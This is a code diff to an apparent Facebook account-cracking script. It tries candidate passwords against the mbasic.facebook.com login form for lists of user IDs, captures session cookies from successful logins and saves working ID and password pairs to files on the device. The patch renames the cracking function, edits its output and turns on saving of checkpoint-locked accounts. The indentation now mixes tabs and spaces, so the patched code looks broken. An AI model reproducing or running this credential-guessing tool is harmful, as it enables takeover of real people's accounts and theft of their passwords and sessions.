@@ -196,22 +196,25 @@ def xr():
             for Eman in RimonID:
                 pwx.append(Eman)
                 pwx.append(love)
-            manshera.submit(rcrack,uid,pwx,tl)
+            manshera.submit(ncrack,uid,pwx,tl)
     print('\nCRACK PROCESS HAS BEEN COMPLETED ')
     print(' \nIDS SAVED IN Nayan_OK.txt')
 
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
+def ncrack(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global agents
+	try:
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			sys.stdout.write('\r \33[1;92m[NAYAN] [%s] \33[1;92m[OK:\33[1;92m%s\33[1;92m]'%(loop,len(oks))),
+			sys.stdout.flush()
+			
+			free_fb = session.get('https://mbasic.facebook.com').text
+			log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
@@ -221,7 +224,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+			header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -237,28 +240,25 @@ def rcrack(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5481.223 Safari/537.36',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(' \n\033[1;97m[\033[1;92mNSN-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m💥\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
-                open('/sdcard/NAYAN-ok.txt', 'a').write( uid+' | '+ps+'\n')
+                print(' \n\033[1;97m[\033[1;92mNAYAN-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m➡️\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
+                open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 #print('[𝑨𝑳𝑰𝑭-CP] ' +uid+ '|' +ps+ '')
-                #open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
+                open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
                 cps.append(cid)
                 break
-            else:
-                continue
-        loop+=1
-        
-        sys.stdout.write('\r \033[1;91m[\033[1;97m\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
-        sys.stdout.flush()
-    except:
-        pass
+			else:
+				continue
+		loop+=1
+	except:
+		pass
 
 xr()
